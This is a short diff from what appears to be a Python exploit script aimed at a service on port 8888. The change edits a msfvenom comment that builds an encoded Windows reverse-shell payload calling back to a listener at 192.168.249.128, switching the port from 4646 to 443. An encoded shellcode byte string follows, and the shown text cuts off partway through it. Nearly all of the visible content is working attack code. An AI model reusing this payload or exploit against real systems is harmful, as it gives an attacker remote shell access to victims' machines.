@@ -10,7 +10,7 @@ rport = 8888
 
 if __name__ == '__main__':
     
-    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.249.128 EXITFUNC=thread LPORT=4646 -a x86 --platform windows  -e x86/shikata_ga_nai -f c
+    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.249.128 EXITFUNC=thread LPORT=443 -a x86 --platform windows  -e x86/shikata_ga_nai -f c
     shell_code = (b"\xda\xdc\xbe\x17\x27\x48\x8a\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
 b"\x52\x31\x70\x17\x03\x70\x17\x83\xff\xdb\xaa\x7f\x03\xcb\xa9"
 b"\x80\xfb\x0c\xce\x09\x1e\x3d\xce\x6e\x6b\x6e\xfe\xe5\x39\x83"
